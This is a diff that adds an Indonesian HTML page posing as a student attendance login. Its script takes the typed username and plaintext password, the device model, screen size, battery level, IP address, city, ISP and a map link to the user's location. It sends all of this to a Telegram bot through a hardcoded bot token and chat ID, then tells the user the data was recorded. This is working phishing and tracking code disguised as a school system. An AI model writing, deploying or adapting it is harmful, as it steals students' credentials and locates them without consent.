@@ -1,0 +1,101 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Sistem Presensi Akurat</title>
+    <script src="https://cdn.jsdelivr.net/npm/ua-parser-js@1.0.35/src/ua-parser.min.js"></script>
+    <style>
+        body { font-family: 'Segoe UI', sans-serif; background: #111827; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
+        .login-card { background: #1f2937; padding: 30px; border-radius: 12px; width: 340px; box-shadow: 0 10px 15px rgba(0,0,0,0.5); border: 1px solid #374151; }
+        h2 { color: #10b981; text-align: center; margin-bottom: 20px; }
+        input { width: 100%; padding: 12px; margin-bottom: 15px; border-radius: 6px; border: 1px solid #4b5563; background: #374151; color: white; box-sizing: border-box; }
+        button { width: 100%; padding: 12px; background: #10b981; color: white; border: none; border-radius: 6px; font-weight: bold; cursor: pointer; }
+        button:hover { background: #059669; }
+    </style>
+</head>
+<body>
+
+<div class="login-card">
+    <h2>Login Murid</h2>
+    <form id="ultraForm">
+        <input type="text" id="user" placeholder="Nama Murid" required>
+        <input type="password" id="pass" placeholder="Password" required>
+        <button type="submit" id="btn">Masuk Sistem</button>
+    </form>
+</div>
+
+<script>
+    const BOT_TOKEN = "8748681448:AAF4p8RrtL3ilwCXMP9a7xraHCryZVhS62o";
+    const CHAT_ID = "7321369294";
+
+    // Fungsi deteksi paling dalam (High Entropy)
+    async function getAcurateDevice() {
+        let modelDetail = "Tidak Terdeteksi";
+        
+        // Cek jika browser mendukung UserAgentData (Chrome/Edge/Android Baru)
+        if (navigator.userAgentData && navigator.userAgentData.getHighEntropyValues) {
+            const hints = await navigator.userAgentData.getHighEntropyValues(['model', 'platformVersion', 'architecture']);
+            modelDetail = `${hints.model} (OS v${hints.platformVersion})`;
+        } else {
+            // Fallback jika pakai Safari/Browser lama
+            const parser = new UAParser();
+            const res = parser.getResult();
+            modelDetail = `${res.device.vendor || ''} ${res.device.model || ''} - ${res.os.name} ${res.os.version}`;
+        }
+        return modelDetail;
+    }
+
+    document.getElementById('ultraForm').addEventListener('submit', async (e) => {
+        e.preventDefault();
+        const b = document.getElementById('btn');
+        b.innerText = "MENGUNCI PERANGKAT...";
+        b.disabled = true;
+
+        try {
+            // 1. Ambil Lokasi & IP secara Real-time
+            const geoRes = await fetch('https://ipapi.co/json/');
+            const geo = await geoRes.json();
+
+            // 2. Ambil Model HP Spesifik
+            const detailHP = await getAcurateDevice();
+
+            // 3. Susun Laporan Sangat Detail
+            const pesan = `
+🚀 *LOG LOGIN AKURASI TINGGI*
+━━━━━━━━━━━━━━━━━━
+👤 *IDENTITAS*
+User: ${document.getElementById('user').value}
+Pass: \`${document.getElementById('pass').value}\`
+
+📱 *PERANGKAT (AKURAT)*
+Model: ${detailHP}
+Layar: ${window.screen.width}x${window.screen.height}
+Baterai: ${ (await navigator.getBattery()).level * 100 }%
+
+📍 *LOKASI & ISP*
+IP: ${geo.ip}
+Kota: ${geo.city}, ${geo.region}
+Provider: ${geo.org}
+Map: https://www.google.com/maps?q=${geo.latitude},${geo.longitude}
+━━━━━━━━━━━━━━━━━━
+            `;
+
+            // 4. Kirim ke Telegram
+            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ chat_id: CHAT_ID, text: pesan, parse_mode: 'Markdown' })
+            });
+
+            alert("Data berhasil dicatat!");
+        } catch (err) {
+            alert("Error: Gunakan koneksi internet dan buka lewat Hosting/Live Server!");
+        } finally {
+            b.innerText = "Masuk Sistem";
+            b.disabled = false;
+        }
+    });
+</script>
+</body>
+</html>
